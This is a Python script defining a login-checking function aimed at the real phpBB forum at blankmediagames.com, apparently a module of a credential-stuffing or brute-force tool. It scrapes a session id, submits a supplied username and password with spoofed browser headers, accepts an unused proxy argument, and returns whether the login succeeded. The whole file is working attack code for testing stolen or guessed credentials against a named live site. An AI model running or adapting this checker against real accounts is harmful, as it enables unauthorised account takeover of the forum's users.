import requests
import time
import json

def tryLogin(data, proxy):
	username, password = data

	s = requests.session()
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'DNT': '1',
	    'Connection': 'keep-alive',
	    'Upgrade-Insecure-Requests': '1',
	}

	params = (
	    ('mode', 'login'),
	)

	response = s.get('https://www.blankmediagames.com/phpbb/ucp.php', headers=headers, params=params)
	sid = response.text.split('?sid=')[1].split('"')[0]


	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'DNT': '1',
	    'Connection': 'keep-alive',
	    'Referer': 'https://www.blankmediagames.com/phpbb/ucp.php?mode=login',
	    'Upgrade-Insecure-Requests': '1',
	    'TE': 'Trailers',
	}

	params = (
	    ('mode', 'login'),
	    ('sid', sid),
	)

	data = [
	  ('username', username),
	  ('password', password),
	  ('redirect', './ucp.php?mode=login&sid='+sid),
	  ('redirect', 'index.php'),
	  ('sid', sid),
	  ('login', 'Login'),
	]

	response = s.post('https://www.blankmediagames.com/phpbb/ucp.php', headers=headers, params=params, data=data)


	if "You have been successfully logged in" in response.text:
		return (True, "")
	elif "You have specified an incorrect" in response.text:
		return (False,)
	else:
		raise Exception("Incorrect response")